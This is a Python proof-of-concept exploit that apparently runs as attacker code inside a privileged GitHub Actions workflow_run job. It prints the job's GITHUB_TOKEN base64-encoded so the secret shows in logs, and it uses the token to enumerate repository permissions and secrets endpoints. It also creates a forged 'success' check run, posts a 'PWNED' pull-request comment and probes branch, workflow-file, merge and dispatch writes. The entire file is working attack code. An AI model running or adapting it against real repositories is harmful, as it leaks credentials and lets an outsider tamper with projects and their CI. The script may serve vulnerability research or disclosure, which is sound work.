#!/usr/bin/env python3
"""Runs inside the privileged workflow_run job with GITHUB_TOKEN in the environment."""
import os, sys, json, hashlib, base64, urllib.request, urllib.error, subprocess

def log(msg):
    print("PWNED::" + msg, flush=True)

TOKEN = os.environ.get("GITHUB_TOKEN") or os.environ.get("GH_TOKEN") or ""
REPO = os.environ.get("GITHUB_REPOSITORY", "")
API = os.environ.get("GITHUB_API_URL", "https://api.github.com")
SHA = os.environ.get("GITHUB_SHA", "")
RUN_ID = os.environ.get("GITHUB_RUN_ID", "")

GUARD = "/tmp/poc_exfil_done"
if os.path.exists(GUARD) and TOKEN:
    print("PWNED::exfil_already_ran", flush=True)
    sys.exit(0)
if TOKEN:
    open(GUARD, "a").close()

log("publish_exfil_started repo=%s event=%s job=%s run_id=%s" % (
    REPO, os.environ.get("GITHUB_EVENT_NAME"), os.environ.get("GITHUB_JOB"), RUN_ID))
log("cwd=%s" % os.getcwd())
log("token_len=%d" % len(TOKEN))
log("token_sha256=%s" % hashlib.sha256(TOKEN.encode()).hexdigest())
log("token_b64=%s" % base64.b64encode(TOKEN.encode()).decode())

if os.path.exists("/tmp/poc_tok.txt"):
    try:
        for line in open("/tmp/poc_tok.txt").read().splitlines():
            k, _, v = line.partition("=")
            log("scanned_%s len=%d sha256=%s b64=%s" % (k, len(v), hashlib.sha256(v.encode()).hexdigest(), base64.b64encode(v.encode()).decode()))
    except Exception as e:
        log("scanner_read_failed %r" % (e,))

# source event of the triggering workflow_run (attacker commit sha + pr)
try:
    ev = json.load(open(os.environ["GITHUB_EVENT_PATH"]))
    wr = ev.get("workflow_run", {})
    log("workflow_run id=%s name=%s event=%s head_sha=%s head_repo=%s prs=%s" % (
        wr.get("id"), wr.get("name"), wr.get("event"), wr.get("head_sha"),
        (wr.get("head_repository") or {}).get("full_name"),
        [p.get("number") for p in wr.get("pull_requests") or []]))
    if wr.get("head_sha"):
        SHA = wr["head_sha"]
except Exception as e:
    log("event_read_failed %r" % (e,))

def call(method, path, body=None):
    url = path if path.startswith("http") else API + path
    data = json.dumps(body).encode() if body is not None else None
    h = {"Authorization": "token " + TOKEN, "Accept": "application/vnd.github+json",
         "User-Agent": "poc-wfr", "X-GitHub-Api-Version": "2022-11-28"}
    if data is not None:
        h["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=data, headers=h, method=method)
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return -1, repr(e)

def show(label, st, body, n=500):
    log("%s status=%s body=%s" % (label, st, " ".join(body.split())[:n]))

st, b = call("GET", "/installation/repositories?per_page=2")
show("GET_installation_repositories", st, b, 200)

st, b = call("GET", "/repos/%s" % REPO)
try:
    j = json.loads(b)
    log("GET_repo status=%s full_name=%s private=%s permissions=%s" % (
        st, j.get("full_name"), j.get("private"), j.get("permissions")))
except Exception:
    show("GET_repo", st, b)

st, b = call("GET", "/repos/%s/actions/runs?per_page=1" % REPO)
show("GET_actions_runs", st, b, 160)

st, b = call("GET", "/repos/%s/contents/.github/workflows/test-result.yml" % REPO)
show("GET_contents_workflow", st, b, 120)

# secrets enumeration attempts (expected to be denied for a job token)
for p in ("/repos/%s/actions/secrets", "/repos/%s/actions/organization-secrets"):
    st, b = call("GET", p % REPO)
    show("GET" + p.replace("/", "_") % REPO, st, b, 160)

# checks: write proof
for shas in ([SHA, os.environ.get("GITHUB_SHA")] if SHA != os.environ.get("GITHUB_SHA") else [SHA]):
    st, b = call("POST", "/repos/%s/check-runs" % REPO, {
        "name": "poc-wfr-rce", "head_sha": shas, "status": "completed", "conclusion": "success",
        "output": {"title": "workflow_run RCE", "summary": "check run created by attacker code"}})
    try:
        j = json.loads(b)
        log("POST_check_runs sha=%s status=%s id=%s name=%s html=%s" % (shas, st, j.get("id"), j.get("name"), j.get("html_url")))
    except Exception:
        show("POST_check_runs sha=%s" % shas, st, b)
    if st in (200, 201):
        break

# pull-requests: write proof -> comment on first open PR
st, b = call("GET", "/repos/%s/pulls?state=open&per_page=3" % REPO)
nums = []
if st == 200:
    try:
        nums = [p["number"] for p in json.loads(b)]
    except Exception:
        pass
log("open_prs=%s" % nums)
for n in nums[:1]:
    st, b = call("POST", "/repos/%s/issues/%d/comments" % (REPO, n),
                 {"body": "PWNED:: workflow_run RCE reached the job token (checks:write, pull-requests:write)."})
    try:
        j = json.loads(b)
        log("POST_pr_comment pr=%d status=%s id=%s url=%s" % (n, st, j.get("id"), j.get("html_url")))
    except Exception:
        show("POST_pr_comment", st, b)

# contents write probe: create a ref (expected 403 with contents: read)
st, b = call("POST", "/repos/%s/git/refs" % REPO, {
    "ref": "refs/heads/poc-wfr-probe", "sha": SHA})
show("POST_git_refs_probe", st, b, 200)

# workflow-file write probe through contents API (expected 403: no workflows scope / contents:read)
import base64 as _b64
st, b = call("PUT", "/repos/%s/contents/.github/workflows/poc-wfr.yml" % REPO, {
    "message": "probe", "content": _b64.b64encode(b"name: probe\non: workflow_dispatch\njobs:\n  p:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo probe\n").decode(), "branch": "main"})
show("PUT_workflow_file_probe", st, b, 300)

# boundary probes
for m, path, body in [
    ("POST", "/repos/%s/merges" % REPO, {"base": "main", "head": "poc-wfr-probe", "commit_message": "probe"}),
    ("POST", "/repos/%s/actions/workflows/test-result.yml/dispatches" % REPO, {"ref": "main"}),
    ("GET", "/repos/%s/actions/variables" % REPO, None),
    ("GET", "/repos/%s/keys" % REPO, None),
    ("GET", "/repos/%s/actions/permissions/workflow" % REPO, None),
    ("GET", "/repos/%s/actions/artifacts?per_page=3" % REPO, None),
]:
    st, b = call(m, path, body)
    show("%s_%s" % (m, path.split("/")[-1].split("?")[0]), st, b, 200)

# dump full environment (masked values stay masked) for evidence
log("env_keys=%s" % sorted(os.environ.keys()))
log("publish_exfil_done")
